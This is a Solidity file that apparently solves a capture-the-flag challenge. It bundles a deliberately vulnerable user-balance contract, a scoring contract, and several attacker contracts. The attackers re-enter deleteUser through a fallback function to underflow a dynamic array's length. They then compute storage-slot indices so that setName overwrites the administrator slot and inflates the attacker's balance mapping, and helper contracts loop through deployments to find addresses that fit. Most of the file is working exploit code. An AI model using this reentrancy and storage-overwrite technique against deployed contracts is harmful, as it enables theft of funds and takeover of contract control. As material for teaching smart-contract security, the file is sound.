// 1.修改administration.2.调用者token余额大于1000000ether

pragma solidity ^0.4.24;

contract userinfoAttack{
    check public che;
    userinfo public info;
    uint256 public times;
    constructor(address _che)public{
        che = check(_che);
        info = che.info();
    }

    function add(string _name)internal {
        info.addUser.value(msg.value)(_name);
    }
    function deleteU()internal{
        info.deleteUser();
    }
    function setN(uint256 index,string memory name)internal{
        info.setName(index,name);
    }

    function init()public{
        add("a");
        deleteU();

    }
    function att1()public{
        setN(fig2(address(this)),"");
    }

    function att2()public{
        setN(fig5(address(this)),"sbgzx");
    }
    function complete()public{
        che.isCompleted();
    }
    function()external payable{
        if(times<2){
            times+=1;
            info.deleteUser();
        }
    }

    function arrayStart(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(2));
    }
    function arrayEle(address _addr) public pure returns(bytes32){
        return keccak256(arrayStart(_addr));
    }
    function fig1(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;
    }
    function fig2(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;
    }
    function fig3(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(1));
    }
    function fig4(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;
    }
    function fig5(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;
    }
}

contract deploy{
    userinfoAttack public user;
    function arrayStart(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(2));
    }
    function arrayEle(address _addr) public pure returns(bytes32){
        return keccak256(arrayStart(_addr));
    }
    function fig1(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;
    }
    function fig2(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;
    }
    function fig3(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(1));
    }
    function fig4(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;
    }
    function fig5(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;
    }

    function dep(address _addr)public{
        for(uint i=0;i<999;i++){
           userinfoAttack _user = new userinfoAttack(_addr);
            if (fig1(address(_user)) ==0&& fig4(address(_user))==0){
                user = _user;
                break;
            }
        }
        
    }
}

contract att{
    check che;
    userinfo info;
    uint256 times ;
    constructor(check addr) public {
        che = addr;
        info = che.info();
    }

    function() external payable{
        if(times<2){
            times+=1;
            info.deleteUser();
        }
    }
    function attract() public {
        info.addUser.value(msg.value)("zp");
        info.deleteUser();
        info.setName(getUserIndex(address(this)),"");
        info.setName(getBalacneIndes(address(this)),"ssssssssssssssssssss");
        che.isCompleted();
    }
    function getUserArrSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(2)));
    }
    function getUserSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(getUserArrSolt(addr)));
    }
    function getUserAddress(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserSolt(addr)) + 1 ) % 2;
    }
    function getUserIndex(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserSolt(addr)) + 1) / 2;
    }

    function getBalanceSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(1)));
    }  
    function getBalanceAddress(address addr) public view returns(uint256){
        return (uint256(getBalanceSolt(addr)) - uint256(getUserSolt(addr))) % 2;
    }
    function getBalacneIndes(address addr) public view returns(uint256){
        return (uint256(getBalanceSolt(addr)) - uint256(getUserSolt(addr))) / 2;
    }
    function getuint256(bytes32 a) public view returns(uint256){
        return uint256(a); 
    }
    
}
contract getAddress {
    check che;
    att public att1;
    constructor(check addr) public {
        che = addr;
    }
    function getUserArrSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(2)));
    }
    function getUserSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(getUserArrSolt(addr)));
    }
    function getUserAddress(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserSolt(addr)) + 1 ) % 2;
    }
    function getUserIndex(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserSolt(addr)) + 1) / 2;
    }

    function getBalanceSolt(address addr) public view returns(bytes32){
        return keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(1)));
    }  
    function getBalanceAddress(address addr) public view returns(uint256){
        return (uint256(getBalanceSolt(addr)) - uint256(getUserSolt(addr))) % 2;
    }
    function getBalacneIndes(address addr) public view returns(uint256){
        return (uint256(getBalanceSolt(addr)) - uint256(getUserSolt(addr))) / 2;
    }
    function getuint256(bytes32 a) public view returns(uint256){
        return uint256(a); 
    }
    function get() public {
        for(uint256 i =  0; i<999; i++){
            att addr1 = new att(che);
            if(getUserAddress(address(addr1))==0 && getBalanceAddress(address(addr1))==0){
                att1 = addr1;
                break;
            }
        }
    }
}


contract userinfo{
    address public administration;//0
    mapping(address => uint256)public balances;//1
    struct User{
        string name;
        uint256 balance;
    }
    mapping(address => User[])public users;//2
    constructor()public{
        administration = msg.sender;
    }
    
    function addUser(string memory _name)public payable{
        User memory user;
        user.name = _name;
        user.balance = msg.value;

        users[msg.sender].push(user);
        balances[msg.sender]+=msg.value;
    }

    function deleteUser()public{
        uint256 len = users[msg.sender].length;
        User memory user = users[msg.sender][len-1];

        require(balances[msg.sender]>=user.balance,"balance error");
        balances[msg.sender]-=user.balance;
        bool success =msg.sender.call.value(user.balance)();
        require(success,"transfer error");

        users[msg.sender].length--;
    
    }

    function setName(uint256 index,string memory newName)public{
        User storage user = users[msg.sender][index];
        user.name = newName;
    }

}
contract check{
    uint256 public score;
    userinfo public info = new userinfo();

    function isCompleted()public{
        score =0;
        if (info.administration()==address(0)){
            score+=25;
        }

        if(info.balances(msg.sender)>=1000000 ether){
            score+=75;
        }
    }
    
}